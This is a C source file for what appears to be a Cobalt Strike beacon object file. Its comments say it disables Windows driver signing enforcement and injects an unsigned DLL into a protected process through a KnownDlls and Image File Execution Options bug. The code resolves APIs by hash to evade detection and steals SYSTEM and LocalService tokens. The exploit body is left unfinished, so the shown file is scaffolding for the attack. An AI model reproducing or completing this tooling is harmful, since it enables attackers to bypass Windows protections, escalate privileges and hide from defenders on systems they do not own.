/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Injects a arbitrary unsigned DLL into a protected
 * process. Leverages a bug in DefineDosServices and
 * Application Verifiers to force the DLL to load.
 *
**/

D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
	if ( BeaconApi->BeaconIsAdmin( ) ) {

		INT			NamLen = 0;
		INT			DllLen = 0;

		HANDLE			SysTok = NULL;
		HANDLE			LclTok = NULL;

		LPWSTR			DllNam = NULL;
		LPWSTR			LnkNam = NULL;
		LPWSTR			RegNam = NULL;

		LPWSTR			KwnPth = NULL;
		LPWSTR			LnkPth = NULL;
		LPWSTR			GblPth = NULL;
		LPWSTR			ObjPth = NULL;
		LPWSTR			DskPth = NULL;
		LPWSTR			RegPth = NULL;

		PVOID			NtlMod = NULL;
		PVOID			K32Mod = NULL;
		PVOID			AdvMod = NULL;

		API			ApiTbl;
		DATAP			Parser;
		STARTUPINFOW		StartW;
		UNICODE_STRING		UniOne;
		UNICODE_STRING		UniTwo;
		OBJECT_ATTRIBUTES	ObjAtt;
		PROCESS_INFORMATION	ProcIn;
		SECURITY_DESCRIPTOR	SecDes;

		RtlSecureZeroMemory( &ApiTbl, sizeof( ApiTbl ) );
		RtlSecureZeroMemory( &Parser, sizeof( Parser ) );
		RtlSecureZeroMemory( &StartW, sizeof( StartW ) );
		RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
		RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
		RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
		RtlSecureZeroMemory( &ProcIn, sizeof( ProcIn ) );
		RtlSecureZeroMemory( &SecDes, sizeof( SecDes ) );

		NtlMod = PebGetModule( H_LIB_NTDLL );
		K32Mod = PebGetModule( H_LIB_KERNEL32 );
		AdvMod = PebGetModule( H_LIB_ADVAPI32 );

		ApiTbl.RtlAnsiStringToUnicodeString = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESTRING );
		ApiTbl.NtCreateSymbolicLinkObject   = PeGetFuncEat( NtlMod, H_API_NTCREATESYMBOLICLINKOBJECT );
		ApiTbl.RtlAnsiStringToUnicodeSize   = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESIZE );
		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
		ApiTbl.NtCreateTransaction          = PeGetFuncEat( NtlMod, H_API_NTCREATETRANSACTION );
		ApiTbl.NtOpenProcessToken           = PeGetFuncEat( NtlMod, H_API_NTOPENPROCESSTOKEN );
		ApiTbl.RtlInitAnsiString            = PeGetFuncEat( NtlMod, H_API_RTLINITANSISTRING );
		ApiTbl.IsTokenRestricted            = PeGetFuncEat( AdvMod, H_API_ISTOKENRESTRICTED );
		ApiTbl.NtGetNextProcess             = PeGetFuncEat( NtlMod, H_API_NTGETNEXTPROCESS );
		ApiTbl.DuplicateTokenEx             = PeGetFuncEat( AdvMod, H_API_DUPLICATETOKENEX );
		ApiTbl.NtCreateSection              = PeGetFuncEat( NtlMod, H_API_NTCREATESECTION );
		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
		ApiTbl.LocalFree                    = PeGetFuncEat( K32Mod, H_API_LOCALFREE );
		ApiTbl.NtClose                      = PeGetFuncEat( NtlMod, H_API_NTCLOSE );

		BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
		DllNam = BeaconApi->BeaconDataExtract( &Parser, &NamLen );
		LnkNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
		RegNam = BeaconApi->BeaconDataExtract( &Parser, NULL );

		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls" ) ), DllNam );
		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls" ) ), LnkNam );
		GblPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "GLOBALROOT\\KnownDlls\\%ls" ) ), DllNam );
		ObjPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\KernelObjects\\%ls" ) ), DllNam );
		DskPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "C:\\Windows\\System32\\%ls" ) ), DllNam );
		RegPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls" ) ), RegNam );

		SysTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-18" ) ), 0x16 );
		LclTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-19" ) ), 0x00 );

		if ( SysTok != NULL && LclTok != NULL ) {
			/* oh yeah! */
		} else {
			BeaconApi->BeaconPrintf(
					CALLBACK_ERROR,
					C_PTR( G_SYM( "could not get tokens needed. 0x%x" ) ),
					NtCurrentTeb()->LastErrorValue
			);
		};
Leave:
		if ( SysTok != NULL ) {
			ApiTbl.NtClose( SysTok );
		};
		if ( LclTok != NULL ) {
			ApiTbl.NtClose( LclTok );
		};
		if ( KwnPth != NULL ) {
			ApiTbl.LocalFree( KwnPth );
		};
		if ( LnkPth != NULL ) {
			ApiTbl.LocalFree( LnkPth );
		};
		if ( GblPth != NULL ) {
			ApiTbl.LocalFree( GblPth );
		};
		if ( ObjPth != NULL ) {
			ApiTbl.LocalFree( ObjPth );
		};
		if ( DskPth != NULL ) {
			ApiTbl.LocalFree( DskPth );
		};
		if ( RegPth != NULL ) {
			ApiTbl.LocalFree( RegPth );
		};
	} else { 
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "beacon is not running as an administrative user." ) ) );
	};
};
